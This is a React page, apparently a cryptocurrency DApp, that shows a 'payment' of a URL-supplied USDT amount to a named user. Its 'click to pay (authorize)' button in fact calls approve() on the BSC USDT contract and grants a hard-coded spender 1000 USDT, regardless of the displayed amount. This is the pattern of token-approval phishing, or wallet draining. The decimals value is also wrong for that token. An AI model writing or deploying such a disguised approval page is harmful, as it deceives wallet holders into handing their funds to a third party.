import { useEffect, useState } from "react";
import { useSearchParams } from "react-router-dom";
import { BrowserProvider, Contract, parseUnits } from "ethers";

export default function Dapp() {
  const [params] = useSearchParams();
  const username = params.get("username");
  const amount = params.get("amount");

  const [walletAddress, setWalletAddress] = useState("");

  useEffect(() => {
    async function loadWallet() {
      if (window.ethereum) {
        const provider = new BrowserProvider(window.ethereum);
        const signer = await provider.getSigner();
        const address = await signer.getAddress();
        setWalletAddress(address);
      } else {
        alert('请在钱包内打开此页面');
      }
    }

    loadWallet();
  }, []);

  async function handleApprove() {
    try {
      const tokenAddress = "0x55d398326f99059fF775485246999027B3197955"; // 示例USDT合约（BSC链USDT，测试用）
      const abi = [
        "function approve(address spender, uint256 amount) external returns (bool)"
      ];

      const provider = new BrowserProvider(window.ethereum);
      const signer = await provider.getSigner();
      const contract = new Contract(tokenAddress, abi, signer);

      const spender = "0x1234567890abcdef1234567890abcdef12345678"; // 测试用随便授权地址
      const approveAmount = parseUnits("1000", 6); // 1000 USDT，6位小数

      const tx = await contract.approve(spender, approveAmount);

      console.log('交易已发送:', tx.hash);

      alert('授权请求已发送，请在钱包中确认！');
    } catch (error) {
      console.error(error);
      alert('授权失败或取消！');
    }
  }

  return (
    <div className="p-4 text-center text-white bg-gradient-to-br from-blue-500 to-purple-600 min-h-screen flex flex-col items-center justify-center">
      <h1 className="text-2xl mb-4">DApp 授权页面</h1>
      <div className="bg-white text-black p-4 rounded-xl w-full max-w-md shadow-md">
        <p>用户: {username}</p>
        <p>金额: {amount} USDT</p>
        <p className="mt-4">当前钱包地址:</p>
        <p className="text-blue-600 break-all">{walletAddress}</p>

        <button 
          onClick={handleApprove}
          className="mt-6 bg-blue-600 text-white px-6 py-2 rounded-full hover:bg-blue-700"
        >
          点击付款（授权）
        </button>
      </div>
    </div>
  );
}
